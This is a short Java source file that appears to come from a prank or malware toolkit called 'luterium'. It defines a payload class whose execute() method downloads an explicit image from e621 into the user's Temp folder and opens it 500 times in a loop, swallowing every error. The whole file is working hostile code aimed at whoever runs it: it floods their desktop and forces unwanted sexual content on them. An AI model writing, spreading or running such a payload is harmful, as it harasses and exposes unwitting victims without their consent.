package dev.peter.luterium.features;

import dev.peter.luterium.payload.PayloadExecutor;
import dev.peter.luterium.utils.FileUtil;

import javax.imageio.ImageIO;
import java.awt.*;
import java.io.File;
import java.net.URI;

/**
 * @author Peter
 * @since 10/16/2022
 * Yeah.
 */

public class FurryPorn implements PayloadExecutor {
    FileUtil fileUtil = new FileUtil();

    File path = new File(System.getProperty("user.home") + "\\AppData\\Local\\Temp\\smx.png");

    @Override
    public void execute() throws Exception {
        fileUtil.downloadFile("https://static1.e621.net/data/sample/93/68/9368cca139a855bd2d1322fab98d84e8.jpg", path);

        for(int i = 0; i < 500; i++) {
            try {
                Desktop.getDesktop().open(path);
            }
            catch (Exception exception) {}
        }
    }
}
